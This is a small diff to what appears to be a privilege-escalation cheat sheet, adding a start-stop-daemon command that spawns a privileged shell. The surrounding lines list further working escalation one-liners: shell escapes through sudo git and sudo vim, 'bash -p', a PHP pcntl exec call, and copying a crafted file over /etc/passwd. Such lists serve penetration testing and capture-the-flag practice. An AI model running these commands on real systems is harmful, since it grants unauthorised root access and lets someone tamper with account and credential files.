@@ -52,6 +52,7 @@ sudo git branch --help config    ..small window then: \!/bin/dash
 sudo vim -c ':!/bin/sh'  
 /usr/bin/bash -p 
 /usr/bin/cp /tmp/newpasswd /etc/passwd 
+/usr/sbin/start-stop-daemon -n foo -S -x /bin/sh -- -p
 
 CMD="/bin/sh"; 
 php7.2 -r "pcntl exec('/bin/sh', ['-p']);" 
